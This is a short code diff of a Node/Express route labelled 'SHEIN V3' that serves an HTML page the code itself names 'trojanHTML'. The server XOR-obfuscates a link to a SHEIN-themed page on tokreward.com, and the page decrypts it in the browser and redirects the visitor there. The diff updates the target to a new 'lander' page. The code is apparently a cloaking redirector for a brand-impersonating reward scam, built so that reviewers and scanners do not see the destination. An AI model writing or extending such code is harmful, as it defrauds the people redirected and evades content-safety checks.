@@ -881,9 +881,9 @@ const xorEncrypt = (str, key) => {
 // SHEIN V3
 app.get('/sheinv3/:slug', (req, res, next) => {
     const { offer, slug } = req.params;
-    const seven = `https://tokreward.com/shein.html?slug=${slug}`;
+    const lander = `https://tokreward.com/trshein.html?slug=${slug}`;
     const key = 'delet-';
-    const eight = xorEncrypt(seven, key);
+    const encryptedlander = xorEncrypt(lander, key);
     const trojanHTML = `
         <!DOCTYPE html>
         <html lang="en">
@@ -903,7 +903,7 @@ app.get('/sheinv3/:slug', (req, res, next) => {
                         return result;
                     };
                     const nine = "${key}";
-                    const eight = "${eight}";
+                    const eight = "${encryptedlander}";
                     const seven = xorDecrypt(eight, nine);
                     window.location.href = seven;
                 }
